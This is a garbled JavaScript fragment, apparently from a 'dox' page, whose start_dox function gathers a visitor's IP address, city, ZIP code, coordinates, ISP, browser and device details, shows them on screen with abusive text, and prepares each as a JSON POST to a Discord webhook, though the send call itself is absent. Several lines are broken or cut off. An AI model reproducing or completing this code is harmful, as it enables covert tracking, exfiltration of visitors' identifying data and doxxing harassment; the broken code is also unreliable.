    async function start_dox() {
      console.log("DOXXED BITCH");
      let dox = document.getElementById("dox");

      ).parseUserAgent();

      async function push(key, value) {
        // Display information on the screen
        let span = document.createElement("span");
        span.innerText = key + ": " + value;
        overlay.appendChild(span);
        const height = overlay.getBoundingClientRect().height;
        if (height > window.innerHeight) {
          console.log("font size");
          fontSize = fontSize - fontSize / 10;
          overlay.style.fontSize = fontSize + "px";
        }

        // Send information to Discord webhook
        const data = {
          content: `${key}: ${value}`,
        };

        const requestOptions = {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
          },
          body: JSON.stringify(data),
        };
        await new Promise((res, rej) => setTimeout(res, 600)); // Add a delay for rate limiting
      }

      await push("IP Address", basic.YourFuckingIPAddress);
      await push("Country", detailed.country);
      await push("Region", detailed.regionName);
      await push("City", detailed.city);
      await push("ZIP Code", detailed.zip);
      await push("Full Location", basic.YourFuckingLocation);
      await push("Latitude", detailed.lat);
      await push("Longitude", detailed.lon);
      await push("Timezone", detailed.timezone);
      await push("Current Time", new Date().toLocaleString());
      await push("ISP", detailed.isp);
      await push("Organization", detailed.org);
      await push("Autonomous System", detailed.as);
      await push("Browser Name", detector.name);
      await push("Platform Name", detector.platform);
      await push("Browser Version", detector.version);
      await push(
        "Mobile/Tablet",
        detector.isMobile || detector.isTablet ? "Yes" : "No"
      );
      await push("User Agent", navigator.userAgent);
      await push("Platform", navigator.platform);
      await push("Language", navigator.language);
      await push("Browser Online", navigator.onLine ? "Yes" : "No");
      await push("Cookie Enabled", navigator.cookieEnabled ? "Yes" : "No");
      await push("Java Enabled", navigator.javaEnabled() ? "Yes" : "No");
      await push(
        "Device Memory",
        navigator.deviceMemory ? navigator.deviceMemory : null
      );
      await push(
        "Device Type",
        navigator.userAgentData ? navigator.userAgentData.platform : null
      );
      await push(
        "Browser Type",
        navigator.userAgentData ? navigator.userAgentData.brands : null
      );
      await push(
        "Browser Version",
        navigator.userAgentData ? navigator.userAgentData.version : null
      );
      await push(

      await push(

      await push("Referrer", document.referrer || "None");
      await push("System Languages", navigator.languages.join(", "));
      await push("Screen Width", screen.width, "px");
      await push("Screen Height", screen.height, "px");
      if (screen.width != window.width || screen.height != window.height) {
        await push("Window Width", window.outerWidth, "px");
        await push("Window Height", window.outerHeight, "px");
      }
      await push("Display Pixel Depth", screen.pixelDepth);
      if (typeof screen.orientation != "undefined") {
        await push("Screen Orientation", screen.orientation.type.split("-")[0]);
        await push("Screen Rotation", screen.orientation.angle, " degrees");

      await push("CPU Threads", navigator.hardwareConcurrency);

      const canvas = document.createElement("canvas");

        );
